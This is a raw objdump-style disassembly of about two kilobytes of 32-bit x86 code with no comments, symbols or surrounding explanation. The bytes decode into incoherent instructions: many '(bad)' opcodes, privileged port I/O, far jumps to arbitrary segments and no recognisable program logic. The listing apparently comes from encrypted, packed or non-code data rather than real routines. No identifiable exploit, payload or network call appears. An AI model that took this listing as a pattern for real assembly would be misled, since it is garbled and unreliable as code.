  4167d4:	lock sub eax,0xa141fdc
  4167da:	sub    eax,0x6faf98ad
  4167df:	ret    0xe4f6
  4167e2:	and    cl,BYTE PTR [ecx-0x5a686d9e]
  4167e8:	xlat   BYTE PTR ds:[ebx]
  4167e9:	jne    0x4167d1
  4167eb:	fcomp  st(7)
  4167ed:	sub    dh,cl
  4167ef:	add    DWORD PTR ds:[esi+ebx*1],0xebe12ce8
  4167f7:	mov    ?,WORD PTR [esi-0x3ad91190]
  4167fd:	pop    ebp
  4167fe:	pop    eax
  4167ff:	xchg   BYTE PTR [esi],bl
  416801:	cmp    DWORD PTR [ebx-0x1b],ebp
  416804:	add    al,0xbf
  416806:	push   ebp
  416807:	mov    edi,0x5b952f02
  41680c:	and    bl,bh
  41680e:	fst    DWORD PTR [eax]
  416810:	stos   DWORD PTR es:[edi],eax
  416811:	cmc    
  416812:	adc    BYTE PTR [esi+0x6f],0x48
  416816:	mov    eax,0xb3354d0e
  41681b:	mov    ah,0x14
  41681d:	je     0x4167b5
  41681f:	shl    BYTE PTR ds:0x660f6209,cl
  416825:	rol    DWORD PTR [ecx-0x70],1
  416828:	xor    eax,0x437e5cb
  41682d:	sbb    DWORD PTR [ecx],edi
  41682f:	push   ebx
  416830:	fst    DWORD PTR ds:0x75367874
  416836:	test   eax,eax
  416838:	in     al,dx
  416839:	pop    ds
  41683a:	imul   eax,DWORD PTR [ebp-0x63],0xffffff97
  41683e:	lock add cl,bh
  416841:	mov    WORD PTR [edx-0x6fd1b41c],fs
  416847:	pop    ebp
  416848:	pop    ds
  416849:	fisttp QWORD PTR [ebp-0x4]
  41684c:	cmp    DWORD PTR [edx-0x17],ecx
  41684f:	dec    ebx
  416850:	adc    bl,BYTE PTR [ebp-0x76]
  416853:	scas   ax,WORD PTR es:[edi]
  416855:	(bad)  
  416857:	icebp  
  416858:	(bad)  
  416859:	call   0x6ace36a9
  41685e:	dec    dx
  416860:	ret    0x23ad
  416863:	scas   eax,DWORD PTR es:[edi]
  416864:	jbe    0x41680d
  416866:	mov    bh,0x6d
  416868:	nop
  416869:	xlat   BYTE PTR ds:[ebx]
  41686a:	dec    ecx
  41686b:	out    dx,eax
  41686c:	inc    ebp
  41686d:	pusha  
  41686e:	push   ds
  41686f:	stc    
  416870:	jns    0x41684c
  416872:	jbe    0x416812
  416874:	fstp   TBYTE PTR [ebx-0x3d]
  416877:	dec    edi
  416878:	sbb    BYTE PTR ds:0xa3dc3d76,bl
  41687e:	sub    bl,BYTE PTR [eax-0x1b222d1b]
  416884:	test   al,0xfb
  416886:	adc    DWORD PTR [edx],ebx
  416888:	cmc    
  416889:	add    BYTE PTR [eax-0x4a],cl
  41688c:	(bad)  
  41688d:	ds dec edi
  41688f:	(bad)  
  416891:	dec    eax
  416892:	push   ebx
  416893:	xchg   ecx,eax
  416894:	leave  
  416895:	mov    al,ds:0x7c954d7e
  41689a:	push   ss
  41689b:	(bad)  
  41689d:	push   cs
  41689e:	clc    
  41689f:	xchg   esp,eax
  4168a0:	sbb    bl,BYTE PTR [ebx-0x4cd20350]
  4168a6:	hlt    
  4168a7:	sbb    BYTE PTR [edx+0x64],dl
  4168aa:	mov    bl,0x22
  4168ac:	jmp    0x3b70:0x4e43c8cc
  4168b3:	sbb    DWORD PTR [eax-0x4],ebx
  4168b6:	mov    esp,0x3d930136
  4168bb:	std    
  4168bc:	xor    eax,0xf880cb82
  4168c1:	int    0x28
  4168c3:	jne    0x4168fe
  4168c5:	sub    BYTE PTR [edi],0xe7
  4168c8:	in     eax,dx
  4168c9:	inc    edx
  4168ca:	fld    TBYTE PTR [edi+0x19]
  4168cd:	xchg   DWORD PTR [eax-0x75],edi
  4168d0:	cmp    DWORD PTR [ecx-0x46],ebp
  4168d3:	xchg   esp,eax
  4168d4:	xchg   edi,eax
  4168d5:	push   cs
  4168d6:	cmp    BYTE PTR [eax+0x5dc84711],dl
  4168dc:	xchg   ebx,eax
  4168dd:	push   edx
  4168de:	loope  0x416926
  4168e0:	inc    edi
  4168e1:	xchg   ecx,eax
  4168e2:	rcr    BYTE PTR [eax-0x70722ebd],0x24
  4168e9:	es or  eax,0x1881f51a
  4168ef:	out    0x5b,eax
  4168f1:	test   DWORD PTR [edx+0x18],ebx
  4168f4:	cli    
  4168f5:	out    dx,al
  4168f6:	jle    0x416910
  4168f8:	inc    eax
  4168f9:	mov    ch,0xe5
  4168fb:	fidiv  WORD PTR [eax]
  4168fd:	dec    esp
  4168fe:	cdq    
  4168ff:	cmp    al,0x16
  416901:	pop    es
  416902:	push   esi
  416903:	daa    
  416904:	lea    ebp,[ecx-0x68]
  416907:	imul   edx,DWORD PTR [ebp+0x2a05aaff],0xffffffae
  41690e:	inc    esp
  41690f:	cld    
  416910:	call   0x7f28:0x9160967
  416917:	enter  0x5d9,0x75
  41691b:	test   BYTE PTR [edx],dh
  41691d:	mov    ebp,0x2cc05645
  416922:	mov    esi,0x37ace439
  416927:	mov    dh,0x75
  416929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41692a:	outs   dx,DWORD PTR ds:[esi]
  41692b:	dec    eax
  41692c:	(bad)
  41692f:	fwait
  416930:	push   es
  416931:	cld    
  416932:	adc    ebp,DWORD PTR [eax]
  416934:	mov    ds:0x305d8c81,eax
  416939:	pop    ss
  41693a:	call   0xe1ce29df
  41693f:	(bad)  
  416940:	jmp    0x1e23:0x4777c65e
  416947:	sbb    esp,ebp
  416949:	xor    edx,esi
  41694b:	std    
  41694c:	bound  edx,QWORD PTR [edx+0x7f820124]
  416952:	add    edi,esp
  416954:	(bad)  
  416955:	fcomp  DWORD PTR [esi-0x39]
  416958:	xor    edx,DWORD PTR [edx]
  41695a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41695b:	(bad)  
  41695c:	repz xor BYTE PTR [ebx+0x54],cl
  416960:	bound  esp,QWORD PTR [ebp-0x46]
  416963:	outs   dx,DWORD PTR ds:[esi]
  416964:	test   al,0x98
  416966:	rcl    DWORD PTR [esi-0x28aecf53],0xb5
  41696d:	xor    dl,bh
  41696f:	inc    ebx
  416970:	xor    al,0x8f
  416972:	out    dx,eax
  416973:	leave  
  416974:	(bad)  
  416975:	jb     0x416938
  416977:	lods   eax,DWORD PTR ds:[esi]
  416978:	rol    DWORD PTR [esi-0x75],1
  41697b:	xchg   edi,eax
  41697c:	popa   
  41697d:	mov    ch,0x78
  41697f:	mov    ebx,0xc82064ea
  416984:	dec    ecx
  416985:	mov    ch,0x1c
  416987:	loopne 0x416997
  416989:	adc    eax,0x50972a69
  41698e:	dec    esp
  41698f:	les    ebp,FWORD PTR [ecx+0x5ab8d4f8]
  416995:	add    ch,BYTE PTR [ebx]
  416997:	push   ecx
  416998:	iret   
  416999:	xor    edx,DWORD PTR [eax]
  41699b:	sub    ebx,DWORD PTR [ebx]
  41699d:	pop    ebx
  41699e:	rcr    BYTE PTR [esp+ebp*2],1
  4169a1:	or     DWORD PTR [edx-0x4307da79],esi
  4169a7:	mov    al,0x45
  4169a9:	sti    
  4169aa:	in     eax,0xe9
  4169ac:	nop
  4169ad:	aas    
  4169ae:	popa   
  4169af:	neg    DWORD PTR [ebp-0x26af029c]
  4169b5:	test   bl,dl
  4169b7:	fcomi  st,st(6)
  4169b9:	into   
  4169ba:	test   bl,cl
  4169bc:	aaa    
  4169bd:	adc    al,0x85
  4169bf:	dec    esp
  4169c0:	xchg   ecx,eax
  4169c1:	mov    edi,0x3c224a72
  4169c6:	aaa    
  4169c7:	mov    ecx,0x50941494
  4169cc:	push   ds
  4169cd:	inc    ebp
  4169ce:	sar    ebx,cl
  4169d0:	dec    ecx
  4169d1:	(bad)  
  4169d2:	loop   0x41698a
  4169d4:	pushf  
  4169d5:	dec    eax
  4169d6:	dec    ebp
  4169d7:	mov    al,0x90
  4169d9:	gs jmp 0xa35754ad
  4169df:	mov    ch,0x25
  4169e1:	cmc    
  4169e2:	fistp  DWORD PTR [esi+0x575122ce]
  4169e8:	xor    eax,DWORD PTR ds:0xef5688cb
  4169ee:	fsub   DWORD PTR [ebx-0x45]
  4169f1:	(bad)  
  4169f2:	push   ebx
  4169f3:	xchg   ebx,eax
  4169f4:	or     al,0x9f
  4169f6:	add    al,0x45
  4169f8:	pop    edi
  4169f9:	nop
  4169fa:	int3   
  4169fb:	push   esp
  4169fc:	jb     0x416a5e
  4169fe:	ins    DWORD PTR es:[edi],dx
  4169ff:	dec    esi
  416a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a01:	jmp    0xfb73:0xb3983415
  416a08:	into   
  416a09:	call   0x5277:0x9902e884
  416a10:	mov    WORD PTR [ebx],gs
  416a12:	(bad)  [eax-0x4e298011]
  416a18:	jle    0x416a3f
  416a1a:	dec    ecx
  416a1b:	in     al,dx
  416a1c:	into   
  416a1d:	inc    esp
  416a1e:	pop    DWORD PTR [edi+0x48]
  416a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a22:	sub    al,0x90
  416a24:	lahf   
  416a25:	sbb    esp,DWORD PTR [eax+0x780ce67d]
  416a2b:	(bad)  [edx]
  416a2d:	bnd jo 0x416a8f
  416a30:	lds    eax,FWORD PTR [eax+eiz*1+0x7f503163]
  416a37:	adc    dh,BYTE PTR ds:0x17d580d5
  416a3d:	fimul  WORD PTR [edx-0x6cac37df]
  416a43:	stos   DWORD PTR es:[edi],eax
  416a44:	int3   
  416a45:	mov    esi,ebx
  416a47:	mov    ch,0xcc
  416a49:	or     eax,0x251874fe
  416a4e:	loopne 0x416a38
  416a50:	add    dl,BYTE PTR [edi-0x1e0764d6]
  416a56:	mov    ecx,edi
  416a58:	dec    edx
  416a59:	or     DWORD PTR [esi+0x15],eax
  416a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a5d:	jae    0x416a0f
  416a5f:	jl     0x4169ef
  416a61:	pop    edi
  416a62:	lock pop ecx
  416a64:	inc    ecx
  416a65:	inc    edi
  416a66:	scas   eax,DWORD PTR es:[edi]
  416a67:	cmp    ah,dh
  416a69:	adc    ebp,DWORD PTR [ebp-0x22]
  416a6c:	sbb    al,0x56
  416a6e:	and    al,0x2
  416a70:	ret    
  416a71:	mov    esi,DWORD PTR [edi-0x42]
  416a74:	ins    BYTE PTR es:[edi],dx
  416a75:	lahf   
  416a76:	jne    0x416a89
  416a78:	popa   
  416a79:	xor    BYTE PTR [eax+0x1],0xb6
  416a7d:	cmp    ecx,ebx
  416a7f:	inc    eax
  416a80:	loopne 0x416a57
  416a82:	adc    ebx,DWORD PTR ds:0xedb0cb49
  416a88:	std    
  416a89:	jmp    0x917f:0xf65d37d7
  416a90:	mov    WORD PTR [esi+0x324d0db2],?
  416a96:	pop    ebx
  416a97:	mov    bh,0x3b
  416a99:	cwde   
  416a9a:	(bad)  
  416a9b:	test   eax,0x3c81214d
  416aa0:	stos   BYTE PTR es:[edi],al
  416aa1:	mov    ebp,0xcf25cb7a
  416aa6:	pop    edx
  416aa7:	lods   eax,DWORD PTR ds:[esi]
  416aa8:	dec    ecx
  416aa9:	sub    eax,0x5eb89f52
  416aae:	lock jmp 0x76a0:0x6358cd09
  416ab6:	ss test edi,0x993400e4
  416abd:	(bad)  
  416abe:	nop
  416abf:	inc    eax
  416ac0:	mov    dl,0x35
  416ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ac3:	push   edx
  416ac4:	cmp    esp,eax
  416ac6:	(bad)  
  416ac7:	pop    ds
  416ac8:	cmp    DWORD PTR [ebx+0x1b1619ff],ebp
  416ace:	mov    ds:0x3b1b5b64,eax
  416ad3:	ja     0x416a57
  416ad5:	mov    al,bh
  416ad7:	imul   esi,DWORD PTR [ebx+edi*8-0x57],0xffffff98
  416adc:	jg     0x416af5
  416ade:	out    0x96,al
  416ae0:	sbb    edi,ebx
  416ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ae3:	(bad)  
  416ae4:	lea    esp,[esi+edi*8+0x5f]
  416ae8:	add    dh,BYTE PTR [edx-0x1f]
  416aeb:	cld    
  416aec:	lods   al,BYTE PTR ds:[esi]
  416aed:	push   0xffffffb1
  416aef:	call   0x5d9a:0x6fe4748b
  416af6:	loope  0x416b58
  416af8:	nop
  416af9:	push   esi
  416afa:	mov    ch,0x1f
  416afc:	sti    
  416afd:	(bad)  
  416afe:	sub    al,0x69
  416b00:	sub    esp,edi
  416b02:	(bad)  
  416b03:	(bad)  
  416b04:	mov    cl,0x4d
  416b06:	fcmovnb st,st(5)
  416b08:	push   ecx
  416b09:	loope  0x416b34
  416b0b:	bound  ebx,QWORD PTR [eax+0x60]
  416b0e:	loopne 0x416b69
  416b10:	loop   0x416b10
  416b12:	dec    edi
  416b13:	cld    
  416b14:	repnz xor edx,DWORD PTR [edi]
  416b17:	push   eax
  416b18:	stos   BYTE PTR es:[edi],al
  416b19:	or     esi,DWORD PTR [edx+0x6dc4f622]
  416b1f:	jmp    FWORD PTR [esi+edi*4]
  416b22:	out    dx,eax
  416b23:	add    al,0x78
  416b25:	loope  0x416b09
  416b27:	add    eax,0x63176c7c
  416b2c:	xchg   edi,eax
  416b2d:	test   al,0xb8
  416b2f:	jle    0x416ad4
  416b31:	sub    al,0xde
  416b33:	js     0x416b99
  416b35:	push   es
  416b36:	ds (bad) 
  416b39:	adc    dl,cl
  416b3b:	bound  ebp,QWORD PTR [ecx]
  416b3d:	(bad)  
  416b3e:	push   edx
  416b3f:	pop    ss
  416b40:	jle    0x416b55
  416b42:	dec    ebp
  416b43:	lock aam 0xf8
  416b46:	ins    BYTE PTR es:[edi],dx
  416b47:	or     BYTE PTR [ecx+0x66],bl
  416b4a:	(bad)  
  416b4b:	xlat   BYTE PTR ds:[ebx]
  416b4c:	pop    esp
  416b4d:	mov    ah,0xe3
  416b4f:	mov    ebp,0x90f13d2f
  416b54:	cmp    BYTE PTR [ecx+0x6473b269],cl
  416b5a:	lods   al,BYTE PTR ds:[esi]
  416b5b:	jg     0x416b9e
  416b5d:	test   dh,ch
  416b5f:	jns    0x416ba8
  416b61:	sub    al,0x48
  416b63:	loop   0x416bc2
  416b65:	daa    
  416b66:	sbb    bh,dl
  416b68:	push   edx
  416b69:	ret    
  416b6a:	dec    eax
  416b6b:	lods   eax,DWORD PTR ds:[esi]
  416b6c:	xor    ebx,DWORD PTR [ebp+0x6f87f000]
  416b72:	dec    edi
  416b73:	pusha  
  416b74:	loop   0x416b0b
  416b76:	add    al,0x94
  416b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b79:	push   ebp
  416b7a:	leave  
  416b7b:	loopne 0x416b96
  416b7d:	sahf   
  416b7e:	int    0xb7
  416b80:	outs   dx,DWORD PTR ds:[esi]
  416b81:	mov    edi,0xcedc908a
  416b86:	adc    ecx,DWORD PTR [eax]
  416b88:	out    0xbe,al
  416b8a:	mov    al,ds:0x2ecfdfe1
  416b8f:	imul   BYTE PTR [ecx-0x70cd328c]
  416b95:	pop    eax
  416b96:	inc    eax
  416b97:	ret    0xc878
  416b9a:	cmp    ebp,DWORD PTR [eax+0x7]
  416b9d:	stc    
  416b9e:	jbe    0x416b9e
  416ba0:	cld    
  416ba1:	dec    esp
  416ba2:	inc    esi
  416ba3:	mov    esi,0x932584e7
  416ba8:	adc    al,0x46
  416baa:	loopne 0x416b7a
  416bac:	icebp  
  416bad:	mov    al,0x4
  416baf:	(bad)  
  416bb0:	popa   
  416bb1:	xor    eax,0x27aed9a1
  416bb6:	dec    ebp
  416bb7:	cld    
  416bb8:	neg    ebp
  416bba:	sbb    al,0x34
  416bbc:	packsswb mm3,QWORD PTR [ecx]
  416bbf:	je     0x416bb5
  416bc1:	mov    al,0x1f
  416bc3:	mov    bl,0x7d
  416bc5:	ins    DWORD PTR es:[edi],dx
  416bc6:	dec    ebp
  416bc7:	xchg   edx,eax
  416bc8:	mov    bh,0x81
  416bca:	pop    ebx
  416bcb:	or     esi,DWORD PTR [edi]
  416bcd:	retf   
  416bce:	out    0x8a,eax
  416bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bd1:	mov    ebx,0xaaa200f6
  416bd6:	cmp    eax,0x18f15868
  416bdb:	arpl   WORD PTR [ebp-0x420f1ecb],cx
  416be1:	sbb    ecx,DWORD PTR ds:0x51282d5
  416be7:	popa   
  416be8:	xor    BYTE PTR [esp+0x316f0d9],cl
  416bef:	pop    DWORD PTR [ecx-0x1385a26a]
  416bf5:	(bad)  
  416bf6:	and    al,0x79
  416bf8:	jmp    0xce1:0xeea3cd3b
  416bff:	or     DWORD PTR [ecx],esi
  416c01:	xlat   BYTE PTR ds:[ebx]
  416c02:	and    al,0x4b
  416c04:	sar    BYTE PTR [esi-0x6a],1
  416c07:	inc    ebp
  416c08:	mov    cl,0xae
  416c0a:	sbb    BYTE PTR [ecx+edx*2],dh
  416c0d:	sub    BYTE PTR [ebp+ebx*4-0x311c6d0e],al
  416c14:	and    BYTE PTR [ecx+edx*8-0x219eddd5],dh
  416c1b:	call   esi
  416c1d:	lock mov ebp,edx
  416c20:	fs xchg esi,eax
  416c22:	dec    ebp
  416c23:	fs dec ebp
  416c25:	aas    
  416c26:	xor    al,BYTE PTR [edi]
  416c28:	data16 cmp BYTE PTR [ebx+0x75ece2f2],bh
  416c2f:	mov    edx,0x4bcaaa6f
  416c34:	leave  
  416c35:	sub    esi,DWORD PTR [ecx-0x62233f82]
  416c3b:	pushf  
  416c3c:	outs   dx,DWORD PTR ds:[esi]
  416c3d:	sub    ch,BYTE PTR ds:0x6eb55a0e
  416c43:	gs jbe 0x416c6d
  416c46:	jbe    0x416c9a
  416c48:	inc    esp
  416c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c4a:	int3   
  416c4b:	sub    ebp,esi
  416c4d:	les    ebp,FWORD PTR [ecx-0x2e]
  416c50:	xchg   esp,eax
  416c51:	loop   0x416c38
  416c53:	mov    edi,0x31ead954
  416c58:	in     al,dx
  416c59:	and    ecx,eax
  416c5b:	int3   
  416c5c:	push   ebp
  416c5d:	mov    bh,BYTE PTR [ebx-0x6c]
  416c60:	clc    
  416c61:	mov    ch,0xc7
  416c63:	cmp    DWORD PTR [ebx+0x78],ebx
  416c66:	pop    edi
  416c67:	in     eax,dx
  416c68:	daa    
  416c69:	jns    0x416c94
  416c6b:	aam    0x64
  416c6d:	in     al,0x3e
  416c6f:	add    bl,BYTE PTR [edi+0x682d5c25]
  416c75:	inc    edx
  416c77:	jle    0x416cb2
  416c79:	lahf   
  416c7a:	imul   eax,DWORD PTR [ecx+0x71],0xfb13fe2b
  416c81:	enter  0x9f7b,0x5a
  416c85:	sub    ecx,esi
  416c87:	int3   
  416c88:	or     dh,ch
  416c8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c8b:	dec    esi
  416c8c:	sbb    dl,BYTE PTR [eax]
  416c8e:	fwait
  416c8f:	mov    eax,ds:0x2cb5d418
  416c94:	(bad)  
  416c95:	pop    esp
  416c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c97:	push   ebx
  416c98:	inc    edi
  416c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c9a:	cdq    
  416c9b:	and    DWORD PTR [esi-0x7262af41],0xffffffe6
  416ca2:	ins    BYTE PTR es:[edi],dx
  416ca3:	loop   0x416c53
  416ca5:	mov    esi,0x9ffcd0ed
  416caa:	rcr    DWORD PTR [edx+0x10],cl
  416cad:	int3   
  416cae:	call   0x40034e1a
  416cb3:	gs xchg edi,eax
  416cb5:	and    dh,BYTE PTR [ecx]
  416cb7:	sbb    al,0xf7
  416cb9:	mov    al,ds:0x7e257e41
  416cbe:	push   0x7c4380f8
  416cc3:	jo     0x416c91
  416cc5:	dec    esi
  416cc6:	fdivr  DWORD PTR [ecx+0x7e]
  416cc9:	jno    0x416cc7
  416ccb:	fs aad 0x8f
  416cce:	std    
  416ccf:	test   eax,0xca8d42ab
  416cd4:	mov    WORD PTR [eax+0x4],gs
  416cd7:	sub    dh,dh
  416cd9:	xor    dl,bl
  416cdb:	and    ah,ah
  416cdd:	and    bl,BYTE PTR [edi+0x20]
  416ce0:	ds xchg ebx,eax
  416ce2:	xchg   ebx,eax
  416ce3:	daa    
  416ce4:	xchg   BYTE PTR [edi+0x270e84f1],ah
  416cea:	and    DWORD PTR [edi+0x251bdc02],esp
  416cf0:	sahf   
  416cf1:	out    0x3d,eax
  416cf3:	je     0x416cc8
  416cf5:	std    
  416cf6:	cmp    BYTE PTR [eax+0x24],0x7e
  416cfa:	and    ebx,DWORD PTR [esi-0x5]
  416cfd:	cmp    eax,0x35c2e15c
  416d02:	mov    cl,BYTE PTR [edx+0x48882a99]
  416d08:	inc    eax
  416d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d0a:	inc    eax
  416d0b:	or     eax,0xe23a2fe
  416d10:	ss mov cl,0x9a
  416d13:	pop    edx
  416d14:	xchg   ebx,eax
  416d15:	xor    BYTE PTR [esi],bl
  416d17:	popa   
  416d18:	xor    bh,cl
  416d1a:	inc    eax
  416d1b:	(bad)  
  416d1c:	push   ecx
  416d1d:	cli    
  416d1e:	es add bl,bl
  416d21:	mov    edx,0x19a6e627
  416d26:	push   es
  416d27:	dec    edx
  416d28:	jle    0x416d01
  416d2a:	std    
  416d2b:	cmp    cl,cl
  416d2d:	int    0xa8
  416d2f:	add    al,0x21
  416d31:	add    dl,BYTE PTR [edx+0x1d]
  416d34:	xor    al,0x57
  416d36:	sub    BYTE PTR [ecx],ah
  416d38:	mov    al,ds:0x19e0b493
  416d3d:	xchg   edx,eax
  416d3e:	sar    BYTE PTR [ebp-0x6],cl
  416d41:	jno    0x416cfd
  416d43:	mov    al,ds:0x1d0b6c39
  416d48:	inc    edi
  416d49:	pop    ebp
  416d4a:	adc    BYTE PTR [eax+0x72],0x1e
  416d4e:	lea    edi,[edi]
  416d50:	cmp    BYTE PTR [ebx+0x30907b4a],ah
  416d56:	xor    bh,BYTE PTR [ebx-0x4a]
  416d59:	xor    eax,0xfb24e87f
  416d5e:	pop    ss
  416d5f:	cmc    
  416d60:	jb     0x416db3
  416d62:	jns    0x416d81
  416d64:	imul   eax,DWORD PTR [esi],0xffffff86
  416d67:	xor    DWORD PTR [edx],ebx
  416d69:	push   edi
  416d6a:	scas   eax,DWORD PTR es:[edi]
  416d6b:	retf   
  416d6c:	jmp    0x217:0x1dbf6a04
  416d73:	nop
  416d74:	jp     0x416d57
  416d76:	fdivp  st(0),st
  416d78:	mov    eax,ds:0xb6920aa2
  416d7d:	xchg   ecx,eax
  416d7e:	mov    es,WORD PTR [eax-0x16d433e8]
  416d84:	fnsave [ebx-0x8ad1d7c]
  416d8a:	mov    edx,0x1bec2534
  416d8f:	lods   eax,DWORD PTR ds:[esi]
  416d90:	in     al,dx
  416d91:	fdiv   QWORD PTR [edx+0xd05cb7b]
  416d97:	test   DWORD PTR ds:0xf477ef45,esi
  416d9d:	fwait
  416d9e:	aaa    
  416d9f:	call   0x8c7ab5f
  416da4:	jnp    0x416d34
  416da6:	sbb    dh,BYTE PTR [esi+0x2967651a]
  416dac:	dec    edx
  416dad:	dec    edi
  416dae:	shr    DWORD PTR [edx],0xe3
  416db1:	je     0x416dd0
  416db3:	jb     0x416d3a
  416db5:	push   0x4c7611d8
  416dba:	scas   eax,DWORD PTR es:[edi]
  416dbb:	outs   dx,DWORD PTR ds:[esi]
  416dbc:	jbe    0x416e11
  416dbe:	icebp  
  416dbf:	mov    esp,0xa9889801
  416dc4:	loope  0x416e3e
  416dc6:	(bad)  
  416dc7:	push   ebp
  416dc8:	ja     0x416d7d
  416dca:	mov    DWORD PTR [esi],ecx
  416dcc:	repnz push edx
  416dce:	sbb    eax,0xd62fb9f3
  416dd3:	xchg   DWORD PTR [edi+0x7e],eax
  416dd6:	(bad)  
  416dd7:	ins    DWORD PTR es:[edi],dx
  416dd8:	add    eax,0x2cd6fe97
  416ddd:	cdq    
  416dde:	mov    cs,WORD PTR [eax-0x63]
  416de1:	jae    0x416db7
  416de3:	dec    ebp
  416de4:	es pushf 
  416de6:	test   BYTE PTR [edi+0x43f5f2c7],ah
  416dec:	mov    al,ds:0xb3ffac6b
  416df1:	xor    dh,BYTE PTR [ebx]
  416df3:	jnp    0x416e28
  416df5:	mov    ch,0x52
  416df7:	stos   BYTE PTR es:[edi],al
  416df8:	cld    
  416df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dfa:	mov    eax,ds:0xaccc14f2
  416dff:	xor    eax,0x23c02c2b
  416e04:	push   ds
  416e05:	xchg   ebp,eax
  416e06:	jnp    0x416d8e
  416e08:	mov    eax,0xa0026497
  416e0d:	jg     0x416e11
  416e0f:	cmp    DWORD PTR [ecx],esi
  416e11:	dec    ebx
  416e12:	push   DWORD PTR [ebp+0xbb42daf]
  416e18:	arpl   WORD PTR [ecx],si
  416e1a:	cwde   
  416e1b:	test   BYTE PTR [esi+ecx*8+0x3f9ea41d],ah
  416e22:	arpl   WORD PTR [ebx-0x44a3d0d8],ax
  416e28:	leave  
  416e29:	(bad)  
  416e2a:	lock nop DWORD PTR [ebp+0x4e]
  416e2f:	jge    0x416e29
  416e31:	fsqrt  
  416e33:	xchg   edi,eax
  416e34:	sub    eax,0x54eae258
  416e39:	xchg   esi,eax
  416e3a:	xor    eax,0x64a57196
  416e3f:	adc    BYTE PTR [ebp-0x1c4072e0],0x80
  416e46:	test   eax,0x3c3ac223
  416e4b:	sbb    BYTE PTR [esi],bh
  416e4d:	outs   dx,DWORD PTR ds:[esi]
  416e4e:	mov    eax,ds:0xed892bde
  416e53:	xor    al,dh
  416e55:	inc    esi
  416e56:	repnz mov ah,0xac
  416e59:	xor    eax,0x2c1b9c5b
  416e5e:	xlat   BYTE PTR ds:[ebx]
  416e5f:	and    eax,0xecbdeec3
  416e64:	mov    dl,0x18
  416e66:	push   edx
  416e67:	pop    ebx
  416e68:	and    ebp,DWORD PTR [edi]
  416e6a:	outs   dx,DWORD PTR ds:[esi]
  416e6b:	or     al,0x19
  416e6d:	popa   
  416e6e:	test   bh,bh
  416e70:	sub    eax,0xd65396b0
  416e75:	cmp    ah,ch
  416e77:	dec    eax
  416e78:	xchg   edi,eax
  416e79:	or     dh,BYTE PTR [bp+di+0x2c23]
  416e7e:	(bad)  
  416e7f:	nop
  416e80:	dec    esp
  416e81:	or     DWORD PTR [ecx-0x144bc0df],esp
  416e87:	add    eax,edx
  416e89:	inc    ebp
  416e8a:	jbe    0x416e5b
  416e8c:	pushf  
  416e8d:	jg     0x416f0e
  416e8f:	sub    BYTE PTR [edx-0x14],ah
  416e92:	cld    
  416e93:	dec    edx
  416e94:	sub    DWORD PTR [esp+eax*1],ebp
  416e97:	mov    WORD PTR [edi-0x823f37d],?
  416e9d:	adc    ch,BYTE PTR [edx+0x6098318d]
  416ea3:	out    dx,al
  416ea4:	and    bl,BYTE PTR [edx-0x2cde9d40]
  416eaa:	mov    eax,0xddf5c4c9
  416eaf:	jbe    0x416ee8
  416eb1:	lods   al,BYTE PTR ds:[esi]
  416eb2:	xor    DWORD PTR [ecx],edi
  416eb4:	lods   al,BYTE PTR ds:[esi]
  416eb5:	and    ebx,DWORD PTR [edx+0x34]
  416eb8:	add    bl,dl
  416eba:	lds    edi,FWORD PTR [eax+0x7fc589c1]
  416ec0:	xchg   BYTE PTR [ebp+esi*8-0x26],ch
  416ec4:	out    0x18,eax
  416ec6:	repnz (bad) 
  416ec8:	mov    WORD PTR [eax-0x2a],cs
  416ecb:	popa   
  416ecc:	or     ecx,ebp
  416ece:	fcmovne st,st(4)
  416ed0:	int3   
  416ed1:	inc    eax
  416ed2:	mov    esp,0xb49ec4bd
  416ed7:	sbb    BYTE PTR [edx-0x886b843],dl
  416edd:	lock mov ah,0xb3
  416ee0:	arpl   WORD PTR [esi-0x6035bec4],si
  416ee6:	pop    ebx
  416ee7:	in     eax,dx
  416ee8:	sub    cl,BYTE PTR ds:0xa31c5007
  416eee:	pop    ds
  416eef:	jle    0x416f4e
  416ef1:	sub    edx,DWORD PTR [esi]
  416ef3:	xchg   BYTE PTR [ecx+0x62],dl
  416ef6:	(bad)  
  416ef7:	xor    DWORD PTR [eax+ecx*1],ebp
  416efa:	outs   dx,BYTE PTR ds:[esi]
  416efb:	add    al,0xd1
  416efd:	mov    ds:0x6f1d2405,al
  416f02:	or     ch,BYTE PTR [ebp-0x52]
  416f05:	mov    eax,0x53a4207d
  416f0a:	sbb    DWORD PTR [ebx],edi
  416f0c:	mov    eax,0xc70fc9b0
  416f11:	sub    eax,DWORD PTR [eax+esi*2-0x21]
  416f15:	(bad)  
  416f16:	ins    DWORD PTR es:[edi],dx
  416f17:	inc    esi
  416f18:	ret    0xe35d
  416f1b:	fst    DWORD PTR [ebp+0x7ba5354e]
  416f21:	arpl   WORD PTR [ecx-0x43],sp
  416f24:	or     edi,DWORD PTR [ecx+0x30f29166]
  416f2a:	clc    
  416f2b:	imul   eax,edx,0x11
  416f2e:	mov    WORD PTR [ebp-0x78ca0cf8],?
  416f34:	out    dx,al
  416f35:	xor    BYTE PTR [edx],bl
  416f37:	xor    al,0x3c
  416f39:	imul   ebx,DWORD PTR [eax-0x2dba4112],0xffffffa3
  416f40:	jge    0x416f1d
  416f42:	mov    edi,0xd4813727
  416f47:	adc    al,0xb2
  416f49:	and    eax,0x5b0bfcbf
  416f4e:	jecxz  0x416f36
  416f50:	outs   dx,DWORD PTR ds:[esi]
  416f51:	mov    al,0x64
  416f53:	jmp    0xe12b:0x7c0c6082
  416f5a:	inc    edi
  416f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
